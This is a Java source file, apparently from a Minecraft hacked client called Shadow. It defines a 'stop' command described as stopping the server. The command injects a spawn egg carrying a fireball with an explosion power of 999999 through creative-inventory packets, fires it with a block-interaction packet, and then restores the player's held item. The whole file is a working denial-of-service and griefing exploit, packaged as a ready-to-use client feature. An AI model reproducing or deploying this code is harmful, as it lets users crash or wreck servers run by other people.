package net.shadow.feature.command;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;

public class StopCmd extends Command {
    public StopCmd() {
        super("stop", "stops the server");
    }

    @Override
    public void call(String[] args) {
        Item item = Registry.ITEM.get(new Identifier("bat_spawn_egg"));
        ItemStack stack = new ItemStack(item, 1);
        ItemStack nana = Shadow.c.player.getMainHandStack();
        try {
            stack.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"Server Stopped\",\"color\":\"gray\",\"bold\":true,\"italic\":false}'},EntityTag:{id:\"minecraft:fireball\",ExplosionPower:999999,direction:[0.0,-1.0,0.0],power:[0.0,-1.0,0.0]}}"));
        } catch (Exception ignored) {
        }
        BlockPos pos = new BlockPos(Shadow.c.player.getX(), Shadow.c.player.getY() - 1, Shadow.c.player.getZ());
        BlockHitResult hr = new BlockHitResult(new Vec3d(0, 0, 0), Direction.DOWN, pos, false);
        Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
        Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hr));
        Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, nana));
    }
}
